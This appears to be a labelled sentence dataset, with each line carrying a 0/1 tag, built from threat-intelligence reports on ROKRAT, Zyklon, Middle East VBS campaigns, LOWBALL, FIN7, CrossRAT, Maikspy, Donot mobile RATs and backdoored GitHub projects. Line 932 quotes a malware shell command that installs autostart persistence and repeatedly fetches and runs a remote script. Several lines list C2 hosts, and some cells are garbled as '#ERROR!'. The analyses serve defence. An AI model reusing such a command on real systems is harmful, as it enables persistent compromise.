333	"Brower Stealer For the first time, the ROKRAT sample used during the ""North Korean Human Rights"" contained a browser credentials stealer."	1
334	The code used to perform this task in the same that found within in a Freenki sample deployed in 2016.	1
335	The malware is able to extract the stored passwords from Internet Explorer, Chrome and Firefox.	0
336	For Chrome and Firefox, the malware queries the sqlite database containing the URL, username and password: Additionally, they support the Microsoft Vault mechanism.	0
337	Vault was implemented in Windows 7 it contains any sensitive data (like the credentials) of Internet Explorer.	0
338	Here is the initialization of the Vault APIs: On the left, we have the ROKRAT sample and on the right the FreeMilk sample.	1
339	"You can see that in addition to the code, the author copy-pasted English typos such as ""IE Registery"": PDB Paths We can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article."	1
340	ROKRAT: Wiper: Summary Graph Here is a graph to visualize the similarities and differences between each campaign mentioned in this article: Conclusion South Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy).	0
341	In a specific campaign, this actor took time to compromise multiple legitimate Korean platforms including Yonsei and the KGLS in order to forge the spear phishing campaign or to host the command and control.	0
342	This approach is not common with less advanced actors and demonstrates a high level of maturity and knowledge of the Korean region.	1
343	However Group 123's activities are not limited to South Korea.	0
344	For international targets, they are able to switch to a more standard attack vector such as using Microsoft Office documents as opposed to the specific HWP documents used when targeting victims located in Korea.	1
345	Group 123 does not hesitate to use public exploits and scripting languages to drop and execute malicious payloads.	0
346	We can notice that this group uses compromised legitimate websites (mainly Wordpress) and cloud platforms to communicate with the infected systems.	0
347	This approach makes it difficult to detect communications through analysis of these network flows.	0
348	Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code.	1
349	In addition to the Remote Administration Tools, we identified a wiper.	1
350	We conclude that this group was involved in a campaign of intelligence gathering and finally attempted destruction.	0
351	With our current knowledge of this actor, we predict that they will not disappear anytime soon and will continue to be active during the coming years.	1
352	Group 123 is constantly evolving as the new fileless capability that was added to ROKRAT demonstrates.	1
353	We also believe their target profile may change but for now it will mostly focus on Korean peninsula targets, however, as explained their capabilities will likely continue to evolve over time as they further refine their TTPs.	1

376	Find out more on how we use cookies.Accept Decline Threat Research Microsoft Office Vulnerabilities Used to Distribute Zyklon Malware in Recent Campaign January 17 2018 | by Swapnil Patil, Yogesh Londhe vulnerabilities Malware Microsoft Introduction FireEye researchers recently observed threat actors leveraging relatively new vulnerabilities in Microsoft Office to spread Zyklon HTTP malware.	1
377	Zyklon has been observed in the wild since early 2016 and provides myriad sophisticated capabilities.	1
378	Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal.	1
379	The malware may communicate with its command and control (C2) server over The Onion Router (Tor) network if configured to do so.	1
380	The malware can download several plugins, some of which include features such as cryptocurrency mining and password recovery, from browsers and email software.	1
381	Zyklon also provides a very efficient mechanism to monitor the spread and impact.	1
382	Infection Vector We have observed this recent wave of Zyklon malware being delivered primarily through spam emails.	1
383	The email typically arrives with an attached ZIP file containing a malicious DOC file (Figure 1 shows a sample lure).	1
384	The following industries have been the primary targets in this campaign: Figure 1: Sample lure documents Attack Flow A visual representation of the attack flow and execution chain can be seen in Figure 2.	0
385	Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017 and it is a vulnerability we have observed being exploited in the wild.	1
386	The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3).	1
387	Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently discovered vulnerability (CVE-2017-11882) in Microsoft Office.	1
388	Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4).	0
389	Figure 4: Embedded URL in OLE object Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1.	1
390	Figure 6: PowerShell command to download the Pause.ps1 payload Dynamic Data Exchange (DDE) Dynamic Data Exchange (DDE) is the interprocess communication mechanism that is exploited to perform remote code execution.	1
391	With the help of a PowerShell script (shown in Figure 7), the next payload (Pause.ps1) is downloaded.	1
392	Figure 7: DDE technique used to download the Pause.ps1 payload One of the unique approaches we have observed is the use of dot-less IP addresses (example: hxxp://258476380).	1
393	Figure 8 shows the network communication of the Pause.ps1 download.	1
394	Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8).	1
395	The Pause.ps1 script is responsible for resolving the APIs required for code injection.	1
396	It also contains the injectable shellcode.	0
397	The APIs contain VirtualAlloc(), memset(), and CreateThread().	1
398	Figure 9 shows the decoded Base64 code.	0
399	Figure 9: Base64 decoded Pause.ps1 The injected code is responsible for downloading the final payload from the server (see Figure 10).	1
400	The final stage payload is a PE executable compiled with .Net framework.	1
401	Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities: Figure 11: XML configuration file to schedule the task The Zyklon malware first retrieves the external IP address of the infected machine using the following: The Zyklon executable contains another encrypted file in its .Net resource section named tor.	1
402	This file is decrypted and injected into an instance of InstallUtiil.exe, and functions as a Tor anonymizer.	0
403	Command & Control Communication The C2 communication of Zyklon is proxied through the Tor network.	1
404	The malware sends a POST request to the C2 server.	0
405	The C2 server is appended by the gate.php, which is stored in file memory.	1
406	The parameter passed to this request is getkey=y.	1
407	In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12).	1
408	Figure 12: Zyklon public RSA key After the connection is established with the C2 server, the malware can communicate with its control server using the commands shown in Table 1.	1
409	Command Action sign Requests system information settings Requests settings from C2 server logs Uploads harvested passwords wallet Uploads harvested cryptocurrency wallet data proxy Indicates SOCKS proxy port opened miner Cryptocurrency miner commands error Reports errors to C2 server ddos DDoS attack commands Table 1: Zyklon accepted commands The following figures show the initial request and subsequent server response for the “settings” (Figure 13), “sign” (Figure 14), and “ddos” (Figure 15) commands.	1
410	Figure 13: Zyklon issuing “settings” command and subsequent server response Figure 14: Zyklon issuing “sign” command and subsequent server response Figure 15: Zyklon issuing “ddos” command and subsequent server response Plugin Manager Zyklon downloads number of plugins from its C2 server.	1
411	The plugin URL is stored in file in following format: The following plugins are found in the memory of the Zyklon malware: The downloaded plugins are injected into: Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe.	1
412	Additional Features The Zyklon malware offers the following additional capabilities (via plugins): Browser Password Recovery Zyklon HTTP can recover passwords from popular web browsers, including: FTP Password Recovery Zyklon currently supports FTP password recovery from the following FTP applications: Gaming Software Key Recovery Zyklon can recover PC Gaming software keys from the following games: Email Password Recovery Zyklon may also collect email passwords from following applications: License Key Recovery The malware automatically detects and decrypts the license/serial keys of more than 200 popular pieces of software, including Office, SQL Server, Adobe, and Nero.	1
413	Socks5 Proxy Zyklon features the ability to establish a reverse Socks5 proxy server on infected host machines.	1
414	Hijack Clipboard Bitcoin Address Zyklon has the ability to hijack the clipboard, and replaces the user’s copied bitcoin address with an address served up by the actor’s control server.	1
415	Zyklon Pricing Researchers identified different versions of Zyklon HTTP being advertised in a popular underground marketplace for the following prices: Conclusion Threat actors incorporating recently discovered vulnerabilities in popular software – Microsoft Office, in this case – only increases the potential for successful infections.	1

424	Talos Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Targeted Attacks In The Middle East Wednesday, February 7 2018 Targeted Attacks In The Middle East This blog post is authored by Paul Rascagneres with assistance of Martin Lee.	0
425	Executive Summary Talos has identified a targeted attacks affecting the Middle East.	0
426	This campaign contains the following elements, which are described in detail in this article.	0
427	This is not the first targeted campaign against the region that uses Dar El-Jaleel decoy documents which we have investigated.	1
428	However, we have no indication that the previous campaigns are related.	0
429	"VBS Campaign Stage 1: VBScript The campaign starts with a VBScript named من داخل حرب ايران السرية في سوريا.vbs (""From inside Iran's secret war in Syria.vbs"")."	0
430	Here are the script contents: The purpose of this script is to create the second stage PowerShell script described in the next section.	0
431	Stage 2: PowerShell Script The goal of the generated PowerShell script is to create a Microsoft Office document named Report.doc and to open it.	0
432	Stage 3: Office Document With Macros Here is a screenshot of the Office document: This document purports to be written by Dar El-Jaleel.	0
433	Dar El-Jaleel is a publishing and studies house based in Amman, Jordan.	0
434	This institute is well-known for their research concerning the Palestinian-Israeli conflict and the Sunni-Shia conflict in Iran.	0
435	Tagged as confidential, the document is an analysis report on Iranian activities within the Syrian civil war.	0
436	This document contains a Macro: The purpose of this Macro in to create a WSF (Windows Script File) file and to execute it.	0
437	Stage 4: WSF Script The created WSF script is the main part of the infection: The top of the script contains configuration information: The User-Agent is used to identify the targets.	0
438	The CC filters network connections based on this string, only allowing through connections made with authorised User-Agent strings.	0
439	The first task of the script is to register the infected system by performing an HTTP request to http://office-update[.]services:2095/store.	1
440	Next, the script executes an infinite loop, attempting to contact the /search URI every 5 seconds in order to download and execute additional payloads.	0
441	Additional Payloads The WSF script receives payloads of three types, named s0, s1, s2.	0
442	The payloads are VBScript functions loaded and executed on the fly with the ExecuteGlobal() and GetRef() APIs.	0
443	The only differences between s0,s1 and s2 type payloads are the number of arguments supplied to the executing function.	0
444	s0 does not require any arguments, s1 accepts one argument, and s2 two arguments.	0
445	The downloaded payload functions are obfuscated, here is an example of the raw data: The first element is the function type (s0), followed by a separator -|-'.	0
446	The second element is the obfuscated function; this consists of ASCII values, separated by *'.	0
447	"For example the above data decodes as: Hence, the decoded data is ""-65+148*535-418*""."	0
448	Then follows a second step, again using *' as a separator.	0
449	Each mathematical operation is resolved to obtain a new ASCII value: This technique is used to construct a new VBScript function.	0
450	During our investigation we received 5 different functions.	0
451	Reconnaissance Functions During our investigation we received a reconnaissance function a few minutes after the initial compromise.	0
452	The purpose of the function was to retrieve several pieces of information from the infected system, presumably in order to check if the target is valuable or not (or a sandbox system).	0
453	First, the attacker retrieves the disk volume serial number: Secondly, the payload retrieves any installed anti-virus software: Thirdly, it obtains the Internet IP address of the infected system by querying ipify.org (the code includes a hint that the attacker previously used wtfismyip.com): Thirdly, it retrieves the computer name, the username, the Operating System and the architecture: All these data are sent to the previously mentioned CC using the /is-return URI.	0
454	"The data are stored in the User-Agent separated by ""-|-""."	0
455	Subsequently, we received a second reconnaissance function: The function acts to list the drives of the infected system and their type (internal drive, usb driver etc.)	0
456	Persistence Functions In addition to the reconnaissance functions we received 2 functions linked to the persistence of the WSF script.	0
457	The first script is used to persist, the second is used to clean the infected system.	0
458	Our machine was served this after taking too much time to send a request to the C2 Presumably the attacker determined we were examining their systems and decided to remove the malware to prevent further analysis: Pivot Function Finally, we received a pivot function.	0
459	The function is the only non-s0 function we obtained during our research.	0
460	This is a s1 function that takes one argument: Here is the argument: The purpose is to execute a powershell script: The PowerShell script executes a second base64 encoded script.	0
461	The attacker forces the the system to use the 32 bit version of Powershell even if the operating system architecture is 64 bits.	0
462	Finally we obtain the last PowerShell script: The purpose of this script is to download shellcode from 176[.]107[.]185[.]246 IP, to map it in memory and to execute it.	1
463	The attacker takes many precautions before delivering the shellcode, these will be explained in the next chapter.	0
464	Unfortunately during our investigation we weren't served the anticipated shellcode.	0
465	Attackers OPSEC The attacker behind this campaign put a lot of effort into protecting its infrastructure and to avoid leaking code to analysts.	0
466	The first Command & Control server is protected by CloudFlare.	0
467	This choice complicates the analysis and tracking of the campaign.	0
468	Additionally, the attacker filters on the User-Agent; if your web requests do not fit a specific pattern, your request will be ignored.	0
469	During our analysis the attacker was only active during the morning (Central European Timezone), similarly the various different payloads were only sent during mornings (Central European Time).	0
470	When an infected system receives the pivot function, the attacker disables their firewall for a few minutes to allow this unique IP to download the shellcode.	0
471	Afterwards, the server becomes unreachable.	0
472	Here is a schema of this workflow: Additionally, we saw that the attackers blacklisted some of our specific User-Agent strings and IP addresses used during our investigation This high level of OPSEC is exceptional even among presumed state sponsored threat actors...	0
473	Links with Jenxcus (a.k.a.	0
474	Houdini/H-Worm)?	0
475	If you are familiar with Jenxcus (a.k.a.	0
476	Houdini/H-Worm) you should see some similarities between the VBScript used during this campaign and this well-known malware: usage of the user-agent to exfiltrate data, reconnaissance techniques etc… We cannot tell if the attacker used a new version of Jenxcus or if this malware served as the inspiration for their own malicious code.	0
477	The source code of Jenxcus can be easily found on the Internet.	0
478	However, the adaptation used in this campaign is more advanced: the features/functions are loaded on demand and the initial script does not include all the malicious code unlike Jenxcus.	0
479	Additional Targets We can identify different targets based on the User-Agent used by the attacker to identify victims.	0
480	These are a few examples: c #ERROR!	0
481	"""U.15.7"" a #ERROR!"	0
482	"""738142201756240710471556115716122461214187935862381799187598"" c #ERROR!"	0
483	"""1X.134"" a #ERROR!"	0
484	"""130427201706151111209123451288122413771234715862388136654339"" c #ERROR!"	0
485	"""Fb-20.9"" a #ERROR!"	0
486	"""585010201750201110021112344661899112271619123139116684543113"" Other Campaigns Using Dar El-Jaleel Decoy Documents This is not the first time Talos has investigated targeted campaigns using Dar El-Jaleel decoy documents."	0
487	During 2017 we identified several campaigns using the same decoy documents: This document is a weekly report about the major events occuring during the 1st week of November 2017 talking about the most important events happening in Jordan, Iraq, Syria, Lebanon, Palestine, Israel, Russia, ISIS and the ongoing Gulf Countries conflict with Qatar.	0
488	We encountered this document in campaigns using .NET malware (with the CC: foxlive[.]life) and C++ malware (with the CC: download[.]share2file[.]pro).	1
489	The purpose of the malwares was to retrieve information relating to the targeted systems and to download an additional payload.	0
490	Moreover, we identified another campaign using a share2file[.]pro subdomain.	0
491	Here is the decoy document in this campaign: This document is a pension list of military personnel dated June 2017 containing names of individuals which we have redacted, alongside a military rank.	0
492	We don't know if these campaigns are performed by the same actor or different groups interested in this region.	0
493	These campaigns are still under investigation.	0
494	Conclusion These campaigns show us that at least one threat actor is interested in and targeting the Middle East.	0
495	Due to the nature of the decoy documents, we can conclude that the intended targets have an interest in the geopolitical context of the region.	0
496	The attackers used an analysis report alleged to be written by Dar El-Jaleel, a Jordanian institute specialising in studies of the region.	0
497	Some of these documents are tagged as confidential.	0
498	During the VBS Campaign, we were surprised by the level of OPSEC demonstrated by the attacker and their infrastructure.	0
499	Legitimate service such as CloudFlare were used to hide malicious activities.	0
500	Additionally the attacker used user-agent filtering and firewall rules in order to grant access to specific infected systems for only a few minutes in order to deliver shellcode.	0
501	Following this, the server became unreachable.	0
502	Another notable observation is the fact that the attacker was active only during the morning (Central European timezone) during our investigation.	0
503	The usage of script languages is an interesting approach from the attackers' point of view.	0
504	These languages are natively available on Windows system, provide a high degree of flexibility, and can easily stay under the radar.	0
505	Coverage Additional ways our customers can detect and block this threat are listed below.	0
506	Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.	0

570	LOWBALL Malware Analysis The spear phishing emails contained three attachments in total, each of which exploited an older vulnerability in Microsoft Office (CVE-2012-0158): MD5 Filename b9208a5b0504cb2283b1144fc455eaaa 使命公民運動 我們的異象.doc ec19ed7cddf92984906325da59f75351 新聞稿及公佈.doc 6495b384748188188d09e9d5a0c401a4 (代發)[采訪通知]港大校友關注組遞信行動.doc In all three cases, the payload was the same: MD5 Filename d76261ba3b624933a6ebb5dd73758db4 time.exe This backdoor, known as LOWBALL, uses the legitimate Dropbox cloud-storage service to act as the CnC server.	1
571	After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files: MD5 Filename d76261ba3b624933a6ebb5dd73758db4 WmiApCom 79b68cdd0044edd4fbf8067b22878644 WmiApCom.bat The “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents.	1
572	This particular sample connected to the CnC domain accounts.serveftp[.]com, which resolved to an IP address previously used by the threat group, although the IP had not been used for some time prior to this most recent activity: MD5 0beb957923df2c885d29a9c1743dd94b accounts.serveftp.com 59.188.0.197 BUBBLEWRAP is a full-featured backdoor that is set to run when the system boots, and can communicate using HTTP, HTTPS, or a SOCKS proxy.	1

627	VBScript #1 The dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher.	1
628	This VBScript checks if the “58d2a83f777942.26535794.ps1” PowerShell script is running using WMI queries and, if not, launches it.	1
629	PowerShell Script “58d2a83f777942.26535794.ps1” is a multilayer obfuscated PowerShell script, which launches shellcode for a Cobalt Strike stager.	1
630	The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode.	1
631	If unable to contact the C2 server initially, the shellcode is configured to reattempt communication with the C2 server address in the following pattern: [a-z][a-z][a-z].stage.14919005.www1.proslr3[.]com VBScript #2 “mshta.exe” further executes the second VBScript “58d2a83f777908.23270411.vbs”, which creates a folder by GUID name inside “Intel” and drops the VBScript payloads and configuration files: \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777638.60220156.ini \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777688.78384945.ps1 \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f7776b5.64953395.txt \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f7776e0.72726761.vbs \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777716.48248237.vbs \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\58d2a83f777788.86541308.vbs \Intel\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\Foxconn.lnk This script then executes “58d2a83f777716.48248237.vbs”, which is a variant of FIN7’s HALFBAKED backdoor.	1

722	In other words the malware simply persists itself: $ md5 ~/Library/mediamgrs.jar MD5 (/Users/user/Library/mediamgrs.jar) #ERROR!	1
723	Similar to macOS, it persists itself: Exec=java -jar [this.c] Looking elsewhere in the code, we can see the value for this.c' will be set to: /usr/var/mediamgrs.jar at runtime: else { k.K #ERROR!	1

725	The main logic of the malware is implemented within the crossrat/client.class file.	1
726	As previously discussed, this logic is OS-specific and involves the malware copying itself to a persistent location (as mediamgrs.jar), before setting persistence (registry key, launch agent plist, etc).	1
727	"""/usr/var/""; } ... Once path to the install directory has been dynamically created, the malware makes a copy of itself (mediamgrs.jar) into the install directory: public static void main(String args[]) { ... //build full path and instantiate file obj installFileObj #ERROR!"	1

735	The j' object is defined in the crossrat/j.class file: JD-GUI - j.class Via the java.awt.Robot().createScreenCapture the malware performs a screen capture, temporarily saves it as a disk (as a .jpg with a randomized name), before exfiltrating it to the C&C server.	1
736	A: First check to see if there is an instance of Java is running, that’s executing mediamgrs.jar.	1
737	On macOS or Linux use the ‘ps’ command: $ ps aux | grep mediamgrs.jar user 01:51AM /usr/bin/java -jar /Users/user/Library/mediamgrs.jar One can also look for the persistent artifacts of the malware.	1

775	Our analysis of the latest Maikspy variants revealed that users contracted the spyware from hxxp://miakhalifagame[.]com/, a website that distributes malicious apps (including the 2016 adult game) and connects to its C&C server to upload data from infected devices and machines.	1

778	These buttons greeted users who clicked the Twitter short link of hxxp://miakhalifagame[.]com/ In the case of the Windows variant (WORM_INFOKEY.A) of Maikspy last seen in April 2017 the user will be tricked into downloading a MiaKhalifa.rar file, which contains the files seen in the screenshot below: Figure 9.	1

781	After that, the malware will collect the username and password inputs from web pages and sends it to hxxps://miakhalifagame[.]com/testinn[.]php.	1

789	It has the ability to update itself from hxxp://fakeomegle[.]com/, and steal .jpg, .jpeg, .png, .txt, .wav, .html, .doc, .docx and .rtf files located in the Desktop, Picture, Documents, and Downloads folders, as well as information about the machine’s Internet Explorer, Chrome, Firefox or default browsers, OS, and network configuration.	1
790	The code structure and package name also changed, as well as its C&C address: 198[.]12[.]155[.]84.	1
791	It was in April 2017 when the last Windows variant of Maikspy appeared with the following changes: The C&C server was changed to 198[.]12[.]155[.]84, password theft is added, as well as the theft of .doc, .docx, and .rtf files.	1
792	Between June and December 2017 the Android variant had the following alterations: C&C server was changed to 192[.]169[.]217[.]55, the ability to record phone calls was removed, and the C&C server was again changed to 198[.]12[.]149[.]13.	1
793	Two months later, the C&C server was changed to hxxp://miakhalifagame[.]com.	1

876	奇安信补天威胁情报中心 返回 TI 主页 RESEARCH 数 据 驱 动 安 全 肚脑虫组织（APT-C-35）移动端攻击活动揭露 By 360烽火实验室 | 事件追踪 PDF IOC 传统的APT攻击主要是针对PC端进行，而随着智能手机和移动网络在世界范围内的普及发展，越来越多黑客组织的攻击目标也迅速蔓延到移动端，甚至出现出和PC端结合的趋势。近几年被国内外安全厂商陆续披露的Fancy Bear、Lazarus、Operation Manul、摩诃草、黄金鼠等多个攻击组织无疑印证了这点。近期，360烽火实验室发现肚脑虫组织（APT-C-35）最新的攻击已把移动端也加入到其攻击目标中。 肚脑虫组织（APT-C-35, 后文统称肚脑虫组织），又称Donot，是一个针对克什米尔地区相关国家的政府机构等领域进行网络间谍活动，以窃取敏感信息为主的攻击组织。该组织于2017年3月由360追日团队首次曝光，随后有数个国内外安全团队持续追踪并披露该组织的最新攻击活动。被曝光的的攻击活动都是针对PC端进行，攻击最早在2016年4月，至今活跃，攻击方式主要采用鱼叉邮件进行攻击。2018年8月，一款伪装成KNS Lite(克什米尔新闻服务)移动端RAT进入了我们的视线。随后我们发现到一批同类的移动端RAT，它们最早出现于2017年7月，在2018年进入活跃期。综合我们的调查数据和已知的公开情报，可以确认这是肚脑虫组织发起的一场针对克什米尔地区相关国家（巴基斯坦和印度）的移动端攻击活动，该活动从2017年7月持续至今，采用钓鱼攻击，推测还有邮件或者短信的鱼叉攻击。 载荷投递 肚脑虫组织移动端攻击活动载荷投递的方式目前发现有钓鱼攻击；结合移动端攻击样本伪装的对象、获取到的对应来源名字及窃取信息有邮箱及手机号等，我们推测会使用邮件或者短信的鱼叉攻击。 图1.1 钓鱼网站 该组织之前针对PC端的多次攻击主要采用鱼叉邮件的攻击方式，而移动端的攻击样本出现时的图标和传播时的文件名都伪装成正常应用，再加上攻击时窃取的系统账号(谷歌等)和通讯录联系人手机邮箱信息为鱼叉攻击创造了便利，因此我们推测该行动可能会以鱼叉邮件或者短信进行投递。 伪装方式 肚脑虫组织在移动端攻击行动中使用以下两种伪装方式，用以提升攻击的成功率和隐蔽性。 移动端攻击样本按照运行后的展现形式分为两类：一类会自己实现所伪装应用对象的功能，运行后展示出正常应用的形式来隐藏后台正在发生的间谍活动（见图2.1 左）；另一类无正常应用功能，运行后提示诱导性欺骗消息，并隐藏图标删除快捷方式进行隐藏，实则在后台进行间谍活动（见图2.1 右）。 图2.1 两种用来隐藏正在发生间谍活动的方式举例 文件图标伪装主要有两类：一类是伪装成针对性的克什米尔新闻、印度锡克教相关应用图标；另一类是伪装成通用性的VPN、谷歌服务相关应用图标。此外还有一款游戏“Cannons And Soldiers” 应用图标，猜测被攻击目标应该是该游戏的爱好者。涉及到的伪装图标如下（见图2.2）。 图2.2 伪装的应用软件图标 移动端攻击样本分析 移动端攻击样本属于RAT，具有响应云端指定攻击指令（见图3.1）进行录音、上传联系人/通话记录/短信等恶意行为，除伪装的APP名字和运行后的伪装展现形式不一样，功能基本相同。 图3.1 RAT指令与功能对应关系 受攻击地区分布情况 克什米尔地区位于南亚，在印巴分治时，由于其主权所属问题没有得到解决自此引发出双方一系列的纷争问题。特殊的局势背景，导致该地区遭受多个APT组织频繁的攻击。在对此次攻击活动揭露的同时，我们观察到另一个曾被曝光的Bahamut组织，也正在该地区实行攻击。 通过分析我们发现肚脑虫组织此次攻击事件的目标仍是克什米尔地区，影响的国家为巴基斯坦和印度（见图4.1）。 图4.1受攻击的地区国家分布情况(巴基斯坦和印度) 溯源关联 根据此次移动端攻击的获取信息，结合公开情报，我们从下面几个维度，确认此次攻击的幕后组织为曾发起多个针对PC端攻击活动的肚脑虫组织（APT-C-35）。 移动端和PC端分别使用的C&C中，有一个出现吻合（drivethrough.top）；其次移动端的一个C&C（46.101.204.168）曾经对应着PC端的另一个C&C（sessions4life.pw）；最后两端的一部分C&C都使用谷歌当作跳板，虽然移动端和PC端出现的谷歌ID不是同个。 都是针对克什米尔地区国家。 移动端RAT样本均使用数字英文命名方式，而PC端出现过的名为“Boothelp.exe”的RAT类也使用了相同偏好的命名方式（见图5.1）。 图5.1 Android与PC RAT对比 总结 肚脑虫组织是一个由于国家地缘问题产生的间谍情报活动组织，攻击目标已从PC端发展到移动端。虽被揭露过多次，但由于问题没解决，攻击一直在持续，这也是APT的特性。需要特别注意的是，APT攻击随着时代的发展，PC端不再是独有的目标，与人联系越紧密的每一种网络设备，都会是下一个攻击的新目标。在当下，移动端安全问题日益凸显，移动端APT攻击逐渐严重，移动端的安全意识和安全防护已是人们的一门必修课。 附录A：IOC MD5 4efdbdcb3c341f86c4ff40764cd6468f 89b04c7e0b896a30d09a138b6bc3e828 a1827a948b5d14fb79c87e8d9ec74082 7a2b1c70213ad493a053a1e252c00a54 fc385c0f00313ad3ba08576a28ca9b66 843e633b026c43b63b938effa4a36228 b7e6a740d8f1229142b5cebb1c22b8b1 c2da8cc0725558304dfd2a59386373f7 99ce8b2a17f7961a6b88ba0a7e037b5a 1b3693237173c8b7ee2942b69812eb47 7b00d9246335fd3fbb2cac2f2fe9354b 2a1de3eefb43479bfbc53f677902c993 74aa0abb618f9b898aa293cdbd499a4b 92d79d7a27966ea4668e347fe9a97c62 ca9bc074668bb04552610ee835a0e9cf 28d30f19e96200bcf5067d5fd3b69439 be4117d154339e7469d7cbabf7d36dd1 397ed4c4c372fe50588123d6885497c3 e5f774df501c631b0c14f3cf32e54dfb 47fc61cd1d939c99c000afe430451952 e8b68543c78b3dc27c7951e1dc8fae89 C&C 138.68.81.74 139.59..46.35 206.189.42.61 46.101.204.168 85.204.74.117 95.85.15.131 godspeed.geekgalaxy.com jasper.drivethrough.top 附录B：参考链接 [1]https://ti.360.net/blog/articles/latest-activity-of-apt-c-35/ [2]https://www.reuters.com/article/us-india-cyber-threat/exclusive-india-and-pakistan-hit-by-spy-malware-cybersecurity-firm-idUSKCN1B80Y2 APT-C-35 DONOT 肚脑虫 分享到： 首页 肚脑虫组织（APT-C-35）移动端攻击活动揭露	1

901	Infection vectors Fake job websites The attackers' first attempt to compromise the user involved two malicious websites that mimicked legitimate sites that host job listings: These sites hosted a malicious Microsoft Office document: hxxp://hr-suncor[.]com/Suncor_employment_form[.]doc.	1
902	HTTP mode A DNS request (to 0ffice36o[.]com) is performed with random data encoded with base64.	1
903	This request registers the infected system and received the IP of an HTTP server (185.20.184.138 during the investigation).	1
904	An example of a DNS request: yyqagfzvwmd4j5ddiscdgjbe6uccgjaq[.]0ffice36o[.]com The malware is able to craft DNS requests used to provide the attacker with further information.	1
905	Here is an example of request: oGjBGFDHSMRQGQ4HY000[.]0ffice36o[.]com In this context, the first four characters are randomly generated by the malware using rand().	1
906	First, the malware initiates a DNS query to ask for orders, for example: RoyNGBDVIAA0[.]0ffice36o[.]com The first four characters must be ignored, as mentioned earlier in the article this is random generated characters, and the relevant data is GBDVIAA0.	1
907	Secondly, the malware performs a DNS query with the command ID: t0qIGBDVIAI0[.]0ffice36o[.]com (GBDVIAI0 #ERROR!	1
908	"Finally, the result of the executed command will be sent by multiple DNS request: gLtAGJDVIAJAKZXWY000.0ffice36o[.]com -> GJDVIAJAKZXWY000 -> ""2GT\x01 Vol"" TwGHGJDVIATVNVSSA000.0ffice36o[."	1

917	responding to incidents with candied bacon The Supreme Backdoor Factory Feb 26th, 2019 5:53 pm Recently I was playing with VirusTotal Intelligence and while testing some dynamic behavior queries I stumbled upon this strange PE binary (MD5: 7fce12d2cc785f7066f86314836c95ec).	1
918	The bot contained an update functionality that downloaded AES encrypted and RSA signed “update instructions” file from the other project repository belonging to the user allare778: hxxp://allesare.sourceforge[.]net/en-us/bver The implementation of update mechanism seemed to allow project owner to execute arbitrary system commands on hosts running blazebot.	1
919	The BK.jar file (MD5: 533ac97f44b4aea1a35481d963cc9106, VT) contained the jdl package implementing simple downloader.	1
920	The second JAR file ExplorerSync.db (MD5: 9d4aeb737179995a397d675f41e5f97f, VT) was more interesting as it contained two hardcoded URLs.	1
921	The ecc.freeddns[.]org was set to redirect HTTP requests to jessicacheshire.users.sourceforge[.	1
922	Then I searched for JXplorer on GitHub: If not the number of stars assigned to the repositories I would probably have ignored the results.	1
923	How come the official JXplorer GitHub repository (pegacat/jxplorer) had 39 stars while the next one (serkovs/jxplorer [Wayback Machine copy]) had twice as many?	1
924	Just by looking and their sizes I knew they were different.	1
925	I knew the drill and immediately used bitrock-unpacker to extract JXplorer software files and then compared them.	1
926	The decrypted data contained 15 null-terminated strings.	1
927	I was also very curious what else I can find on GitHub.	1
928	As I was limited with time and resources and was not able to analyze each file in each identified repository I resorted to analyzing only a small subset of files.	1
929	Two of the repositories turned out to contain interesting artifacts that allowed me to draw additional connections and fill existing gaps.	1
930	Below graph shows “social interactions” between the serkovs account, two other accounts that I analyzed (mansiiqkal and ballory) and a number of related (starred/subscribed) repositories: The Missing Link I decided to inspect content of the ballory/ffmpeg [Wayback Machine copy] repository because it did not contain JAR file(s) like most of other identified repositories - instead it had a bunch of Linux binaries, claiming to contain “FFmpeg Linux Build (64 bit)”.	1
931	I did not find that exact build (ffmpeg-git-20180427-64bit-static.tar.xz listed in the readme.txt file) on www.johnvansickle.com so I was not able to compare files.	1
932	"The decrypted data contained shellcode responsible for forking and executing following command in the child process via execve syscall: 1 /bin/sh -c cd /home/`whoami`/.config&&mkdir -p autostart&&cd autostart&&echo [Desktop Entry]>y&&echo Type=Application>>y&&echo Exec=/bin/sh -c ""'while true;do wget hxxp://allesare.sourceforge[.]net/en-us/m -O -|sh;sleep 60;done'"">>y&&chmod 755 y&&mv y .desktop' That was exactly what I was looking for."	1
